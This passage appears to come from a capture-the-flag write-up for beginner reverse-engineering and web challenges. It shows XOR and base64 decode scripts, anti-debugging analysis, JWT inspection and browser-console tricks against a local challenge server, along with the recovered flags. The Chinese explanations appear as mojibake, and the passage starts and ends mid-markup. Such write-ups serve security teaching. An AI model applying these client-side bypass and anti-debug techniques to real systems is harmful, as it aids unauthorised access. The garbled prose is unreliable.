class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64decode</span>(<span class="params">s</span>):</span><br><span class="line">    old_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    new_table = <span class="string">&#x27;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/&#x27;</span></span><br><span class="line">    s = s.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">s</span>):</span><br><span class="line">    t = base64decode(s)</span><br><span class="line">    <span class="comment"># return bytes(i ^ len(t) for i in t)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="string">&#x27;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&#x27;</span>).decode())</span><br><span class="line"><span class="comment"># flag&#123;y0u_kn0w_base64_well&#125;</span></span><br></pre></td></tr></table></figure><h3 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse&#125;</span><br></pre></td></tr></table></figure><h3 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_@r4_900d_andr01d_r4V4rs4r&#125;</span><br></pre></td></tr></table></figure><h3 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h3><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>webå¥½å¥½ç©</p><h3 id="PangBai-è¿‡å®¶å®¶ï¼ˆ1ï¼‰"><a href="#PangBai-è¿‡å®¶å®¶ï¼ˆ1ï¼‰" class="headerlink" title="PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰"></a>PangBai è¿‡å®¶å®¶ï¼ˆ1ï¼‰</h3><p>level1ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<span class="property">eyJsZXZlbCI6MX0</span>.<span class="property">sVTlHQPRzFgVAMZbZrWT5qCKd7zUwYawx9GaFBejOb0</span></span><br></pre></td></tr></table></figure><br>è¿™æ˜¯ä¸€æ®µJWT<br>JWT ç»“æ„ä¸€èˆ¬æ˜¯ï¼š<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">header</span><span class="selector-class">.payload</span><span class="selector-class">.signature</span></span><br></pre></td></tr></table></figure><br>æ‹†åˆ†æˆä¸‰éƒ¨åˆ†ï¼š<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">header</span>:   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br><span class="line">payload:  eyJsZXZlbCI6MX0</span><br><span class="line">signature:sVTlHQPRzFgVAMZbZrWT5qCKd7zUwYawx9GaFBejOb0</span><br></pre></td></tr></table></figure><br>header and payload from base64:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:<span class="string">&quot;HS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">&#123;&quot;level&quot;:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><br>è°œè¯­é¢˜</p><h3 id="ä¼šèµ¢å—"><a href="#ä¼šèµ¢å—" class="headerlink" title="ä¼šèµ¢å—"></a>ä¼šèµ¢å—</h3><p>æŒ‰F12åœ¨3ntranc3æœåˆ°äº†å­—ç¬¦ä¸²ï¼Œä¸€çœ¼base64<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flagç¬¬ä¸€éƒ¨åˆ†ï¼šZmxhZ3tXQTB3ï¼Œå¼€å§‹ä½ çš„æ–°å­¦æœŸå§ï¼:/4cqu1siti0n --&gt;</span><br></pre></td></tr></table></figure><br>æ‰¾åˆ°ç¬¬äºŒå…³<code>http://127.0.0.1:55339/4cqu1siti0n</code><br>çœ‹åˆ°äº†hintï¼šä½ ä¼¼ä¹å¯¹è¿™é—¨å«åš4cqu1siti0nçš„è¯¾å¾ˆå¥½å¥‡ï¼Ÿé‚£å°±æ¥çœ‹çœ‹æ§åˆ¶å°å§ï¼<br>ç‚¹å‡ºç¥ç§˜ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ­å–œä½ ï¼ä½ è·å¾—äº†ç¬¬äºŒéƒ¨åˆ†çš„ flag: <span class="subst">$&#123;data.flag&#125;</span>\nâ€¦â€¦\næ—¶å…‰èè‹’ï¼Œä½ æˆé•¿äº†å¾ˆå¤šï¼Œä¹Ÿå‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ã€‚å»çœ‹çœ‹å§ï¼š/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è¯·æ±‚å¤±è´¥ï¼Œè¯·æ£€æŸ¥è¾“å…¥æˆ–æœåŠ¡å™¨å“åº”ã€‚&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ§åˆ¶å°æç¤º</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ä½ ä¼¼ä¹å¯¹è¿™é—¨å«åš4cqu1siti0nçš„è¯¾å¾ˆå¥½å¥‡ï¼Ÿé‚£å°±æ¥çœ‹çœ‹æ§åˆ¶å°å§ï¼&quot;</span>);</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¯·æ±‚äº†ä¸€ä¸ªåç«¯æ¥å£<code>/api/flag/&lt;className&gt;</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">revealFlag</span>(<span class="string">&#x27;4cqu1siti0n&#x27;</span>)</span><br><span class="line"><span class="title class_">Promise</span>Â &#123;&lt;pending&gt;&#125;</span><br><span class="line">4<span class="attr">cqu1siti0n</span>:<span class="number">95</span> æ­å–œä½ ï¼ä½ è·å¾—äº†ç¬¬äºŒéƒ¨åˆ†çš„ <span class="attr">flag</span>: <span class="title class_">IV95NF</span>9yM2Fs</span><br><span class="line">â€¦â€¦</span><br><span class="line">æ—¶å…‰èè‹’ï¼Œä½ æˆé•¿äº†å¾ˆå¤šï¼Œä¹Ÿå‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ã€‚å»çœ‹çœ‹å§ï¼š/s34l</span><br></pre></td></tr></table></figure><br>ç¬¬ä¸‰å…³<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;submit&quot;</span>&gt;è§£å°!!!&lt;/button&gt;</span><br></pre></td></tr></table></figure><br>æŒ‰é’®è¢«é€»è¾‘å°å°äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&#x27;è§£å°&#x27;</span>) &#123;</span><br><span class="line">    messageElement.<span class="property">textContent</span> = <span class="string">&#x27;å¦‚ä½•æ˜¯å¥½ï¼Ÿ&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è§£å°ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;state&quot;</span>).<span class="property">textContent</span>=<span class="string">&quot;è§£å°&quot;</span>;</span><br><span class="line">ç¬¬ä¸‰éƒ¨åˆ†<span class="title class_">Flag</span>: <span class="title class_">MXlfR</span>3I0c1B, ä½ è§£æ•‘äº†äº”æ¡æ‚Ÿï¼ä¸‹ä¸€å…³: /<span class="title class_">Ap3</span>x</span><br></pre></td></tr></table></figure><br>æµè§ˆå™¨ç¦ç”¨ JavaScript æ—¶.s è¿™ä¸ª class çš„å…ƒç´ è¢«æ˜¾å¼éšè—äº†ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;npscript&gt;</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;s&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/api/flag/Ap3x&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>æ— é‡ç©ºå¤„ï¼ï¼<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span></span><br><span class="line"><span class="string">``</span><span class="string">`   </span></span><br><span class="line"><span class="string">è§£æ•‘å‡ºæ¥ </span></span><br><span class="line"><span class="string">æŠŠ &lt;noscript&gt; é‡Œçš„éšè—å†…å®¹æ’å…¥åˆ°é¡µé¢ä¸­ï¼Œå˜æˆå¯è§çš„ HTMLã€‚    </span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> += <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;noscript&#x27;</span>).<span class="property">innerHTML</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.s&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">e</span> =&gt;</span> e.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;fSkpKcyF9&quot;</span>,<span class="string">&quot;nextLevel&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:004012F1 50                                            push    eax</span><br><span class="line">.text:004012F2 E8 00 00 00 00                                call    $+5</span><br><span class="line">.text:004012F7</span><br><span class="line">.text:004012F7                               loc_4012F7:                             ; DATA XREF: _main+48â†“o</span><br><span class="line">.text:004012F7 58                                            pop     eax</span><br><span class="line">.text:004012F8 83 C0 0C                                      add     eax, (offset loc_401303 - offset loc_4012F7)</span><br><span class="line">.text:004012FB 50                                            push    eax</span><br><span class="line">.text:004012FC C3                                            retn</span><br><span class="line">.text:004012FC                               _main           endp ; sp-analysis failed</span><br><span class="line">.text:004012FC</span><br><span class="line">.text:004012FC                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004012FD E8 FF 90                                      db 0E8h, 0FFh, 90h</span><br><span class="line">.text:00401300 90                                            db 90h</span><br><span class="line">.text:00401301                               ; [00000001 BYTES: COLLAPSED FUNCTION nullsub_3. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.text:00401302                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401302 58                                            pop     eax</span><br><span class="line">.text:00401303</span><br><span class="line">.text:00401303                               loc_401303:           </span><br></pre></td></tr></table></figure><p>è¿™æ®µå…¨nopäº†:</p><p><code>push eax</code>æŠŠeaxå‹æ ˆï¼Œ<code>esp-4=eax</code></p><p><code>call $+5</code>ï¼Œnear callï¼Œåç§»æ˜¯ 0ï¼ˆè¡¨ç¤ºè·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰ï¼Œåˆ©ç”¨ call æŠŠ EIP å‹å…¥æ ˆï¼Œä¸æ˜¯çœŸè·³è½¬ã€‚</p><blockquote><p>è¿‘è·³è½¬<code>near call</code>ï¼Œæœ¬æ®µè°ƒç”¨ï¼ˆåŒä¸€CSï¼‰ï¼Œopcodeä¸ºE8ï¼Œåé¢è€•è€…çš„æ˜¯32bitçš„æœ‰ç¦æ¢ç›¸å¯¹åç§»</p></blockquote><p>æ ˆä¸Šç°åœ¨ï¼ˆä»æ ˆé¡¶å‘ä¸‹ï¼‰ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[esp] = 0x4012F7  ; ç”± call å‹å…¥</span><br><span class="line">[esp+4] = åŸæ¥è¢« push eax å‹å…¥çš„å€¼</span><br></pre></td></tr></table></figure><br>åˆ°è¾¾ <code>loc_4012F7</code>: æ‰§è¡Œ <code>pop eax</code>ï¼šä»æ ˆé¡¶å–<code>eax</code>å†æŠŠ<code>esp+4</code>ï¼Œæ‰€ä»¥<code>eax = loc_4012F7</code></p><p><code>add eax, (offset loc_401303 - offset loc_4012F7)</code>å¾—å‡º<code>eax = loc_4012F7 + (loc_401303 - loc_4012F7) = loc_401303</code></p><p><code>push eax</code>æŠŠeaxå‹æ ˆï¼Œç„¶å<code>retn</code>ä¼šä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªå€¼æŠŠå®ƒä½œä¸ºEIP</p><p>å› æ­¤<code>push eax; retn</code> çš„ç»„åˆç­‰ä»·äº<code>jmp eax</code>ï¼ˆç›´æ¥è·³åˆ° eax æŒ‡å‘çš„åœ°å€ï¼‰</p><p>æ‰§è¡Œå®Œåï¼Œç¨‹åºæµè·³è‡³ ``loc_401303</p><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher=[<span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x13</span>, <span class="number">0x13</span>, <span class="number">0x2</span>, <span class="number">0x1e</span>, <span class="number">0x53</span>, <span class="number">0x1f</span>, <span class="number">0x5c</span>, <span class="number">0x1a</span>, <span class="number">0x27</span>, <span class="number">0x43</span>, <span class="number">0x1d</span>, <span class="number">0x36</span>, <span class="number">0x43</span>, <span class="number">0x7</span>, <span class="number">0x26</span>, <span class="number">0x2d</span>, <span class="number">0x55</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x2d</span>, <span class="number">0x2</span>, <span class="number">0x1c</span>, <span class="number">0x1c</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x55</span>, <span class="number">0x2</span>, <span class="number">0x1b</span>, <span class="number">0x16</span>, <span class="number">0x54</span>, <span class="number">0xf</span>]</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="built_in">len</span>(cipher)</span><br><span class="line">key=<span class="string">&quot;dirty_flower&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    flag[i]=cipher[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br><span class="line"><span class="comment">#flag&#123;A5s3mB1y_1s_r3ally_funDAm3nta1&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="Pangbaiæ³°æ‹‰è®°ï¼ˆ1ï¼‰"><a href="#Pangbaiæ³°æ‹‰è®°ï¼ˆ1ï¼‰" class="headerlink" title="Pangbaiæ³°æ‹‰è®°ï¼ˆ1ï¼‰"></a>Pangbaiæ³°æ‹‰è®°ï¼ˆ1ï¼‰</h3><p>ä½•æ„å‘³<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_m_wrong_flag_dont_submit&#125;</span><br></pre></td></tr></table></figure><br>æ‰¾åˆ°äº†<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( miao | <span class="built_in">IsDebuggerPresent</span>() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(aaa, <span class="string">&quot;nhvviCS&quot;</span>, <span class="number">7</span>);</span><br><span class="line">  aaa[<span class="number">7</span>] = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(&amp;aaa[<span class="number">8</span>], <span class="string">&quot;R&#123;e8%oCrdepIvebcR&quot;</span>, <span class="number">17</span>);</span><br><span class="line">  aaa[<span class="number">25</span>] = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(&amp;aaa[<span class="number">26</span>], <span class="string">&quot;b&gt;&amp;ah&#123;&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    key[i] ^= aaa[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(nhvviguMI?u___o_fWivoM_, <span class="string">&quot;nhvviguMI?u\&quot;,o/fWivoM;&quot;</span>, <span class="number">22</span>);</span><br><span class="line">  nhvviguMI?u___o_fWivoM_[<span class="number">22</span>] = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(Homy<span class="number">2.l</span>__, <span class="string">&quot;Homy2.l#&#123;&quot;</span>, <span class="built_in">sizeof</span>(Homy<span class="number">2.l</span>__));</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    key[k] ^= nhvviguMI?u___o_fWivoM_[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key_init=<span class="string">b&quot;key1key2key3key4key6key7key8key9&quot;</span></span><br><span class="line">flag=[<span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x6f</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x6f</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x3f</span>]</span><br><span class="line">key=<span class="built_in">bytearray</span>(<span class="string">b&#x27;nhvviguMI?u&quot;,o/fWivoM;&#x27;</span>+<span class="built_in">bytes</span>([<span class="number">127</span>])+<span class="string">b&#x27;Homy2.l#&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    key[i]=key_init[i]^key[i]</span><br><span class="line">    flag[i]=flag[i]^key[i%<span class="built_in">len</span>(key)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br><span class="line"><span class="comment"># flag&#123;my_D3bugg3r_may_1s_banned?&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h3><p>ç›´æ¥ç»™ä¸¤ä¸ªæ–‡ä»¶å—é‚£å¾ˆå¥½äº†<br>æœ¬æ¥ç›´æ¥å†™çš„exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher=[<span class="number">0xcc</span>, <span class="number">0x8d</span>, <span class="number">0x2c</span>, <span class="number">0xec</span>, <span class="number">0x6f</span>, <span class="number">0x88</span>, <span class="number">0xed</span>, <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0xed</span>, <span class="number">0xae</span>, <span class="number">0xeb</span>, <span class="number">0x4e</span>, <span class="number">0xac</span>, <span class="number">0x2c</span>, <span class="number">0x8d</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xeb</span>, <span class="number">0x6d</span>, <span class="number">0xcd</span>, <span class="number">0xed</span>, <span class="number">0xee</span>, <span class="number">0xeb</span>, <span class="number">0xe</span>, <span class="number">0x8e</span>, <span class="number">0x4e</span>, <span class="number">0x2c</span>, <span class="number">0x6c</span>, <span class="number">0xac</span>, <span class="number">0xe7</span>, <span class="number">0xaf</span>]</span><br><span class="line"><span class="built_in">input</span>=[<span class="number">0</span>]*<span class="built_in">len</span>(cipher)</span><br><span class="line"><span class="comment">#   for ( i = 0; i &lt; i_1; ++i )</span></span><br><span class="line"><span class="comment">#     input[i] = ((int)(unsigned __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (8 - dword_60004040));</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="built_in">input</span>[i]=cipher[i]&lt;&lt;<span class="number">4</span>|(cipher[i]&gt;&gt;<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>]))</span><br></pre></td></tr></table></figure><br>ä¸å¯è§å­—ç¬¦ï¼Œå»çœ‹çˆ¶è¿›ç¨‹ï¼ŒæŠŠ4æ”¹æˆäº†3<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ptrace</span>(PTRACE_POKEDATA, addr, addr, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><br>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cipher=[<span class="number">0xcc</span>, <span class="number">0x8d</span>, <span class="number">0x2c</span>, <span class="number">0xec</span>, <span class="number">0x6f</span>, <span class="number">0x88</span>, <span class="number">0xed</span>, <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0xed</span>, <span class="number">0xae</span>, <span class="number">0xeb</span>, <span class="number">0x4e</span>, <span class="number">0xac</span>, <span class="number">0x2c</span>, <span class="number">0x8d</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xeb</span>, <span class="number">0x6d</span>, <span class="number">0xcd</span>, <span class="number">0xed</span>, <span class="number">0xee</span>, <span class="number">0xeb</span>, <span class="number">0xe</span>, <span class="number">0x8e</span>, <span class="number">0x4e</span>, <span class="number">0x2c</span>, <span class="number">0x6c</span>, <span class="number">0xac</span>, <span class="number">0xe7</span>, <span class="number">0xaf</span>]</span><br><span class="line"><span class="built_in">input</span>=[<span class="number">0</span>]*<span class="built_in">len</span>(cipher)</span><br><span class="line"><span class="comment">#   for ( i = 0; i &lt; i_1; ++i )</span></span><br><span class="line"><span class="comment">#     input[i] = ((int)(unsigned __int8)s[i] &gt;&gt; dword_60004040) | (s[i] 